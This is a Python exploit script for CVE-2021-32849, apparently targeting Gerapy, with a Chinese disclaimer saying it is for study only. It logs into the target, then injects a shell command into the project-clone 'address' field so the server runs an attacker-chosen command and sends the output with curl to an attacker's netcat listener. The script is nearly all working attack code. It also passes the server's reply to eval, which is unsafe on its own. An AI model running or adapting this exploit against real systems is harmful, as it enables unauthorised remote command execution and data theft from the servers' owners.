#!/bin/python3
# coding:utf-8
# Author:lowkey0808

import sys
import requests
import argparse
import pyfiglet


print(pyfiglet.figlet_format('cve-2021-32849'))
print('''
脚本仅供学习参考，请勿恶意攻击他人网站，
如违法乱纪，造成一切后果由使用者自行承担
技术无罪，与作者无关

使用脚本默认同意以上说明！
''')



def main():
    parser = argparse.ArgumentParser(description='cve-2021-32849', argument_default='',
                                     usage='python3 cve-2021-32849.py -u url -U user -P password -r nc ip -p nc port -c cmd')
    parser.add_argument('-u', help='url', metavar='')
    parser.add_argument('-U', help='user', metavar='')
    parser.add_argument('-P', help='password', metavar='')
    parser.add_argument('-r', help='nc ip', metavar='')
    parser.add_argument('-p', help='nc port', metavar='')
    parser.add_argument('-c', help='cmd', metavar='')
    argv = parser.parse_args()
    url = argv.u
    u1 = url + "/api/user/auth"
    username = argv.U
    password = argv.P
    ip = argv.r
    port = argv.p
    cmd = argv.c
    try:
        burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0",
                         "Accept": "application/json, text/plain, */*",
                         "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                         "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json;charset=utf-8",
                         "Origin": "%s" % url, "Connection": "close", "Referer": "%s" % url}
        burp0_json = {"password": "%s" % password, "username": "%s" % username}
        token = eval(requests.post(u1, headers=burp0_headers, json=burp0_json).text)
        token = 'Token ' + token["token"]

        u2 = url + '/api/project/clone'
        burp0_headers = {"Accept": "application/json, text/plain, */*",
                         "Authorization": "%s" % token,
                         "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36",
                         "Content-Type": "application/json;charset=UTF-8", "Accept-Encoding": "gzip, deflate",
                         "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6", "Connection": "close"}
        burp0_json = {"address": "http://127.0.0.1;curl %s:%s?`%s`" % (ip, port, cmd)}
        requests.post(u2, headers=burp0_headers, json=burp0_json, timeout=3)
        sys.exit()
    except Exception as e:
        sys.exit()


if __name__ == "__main__":
    main()
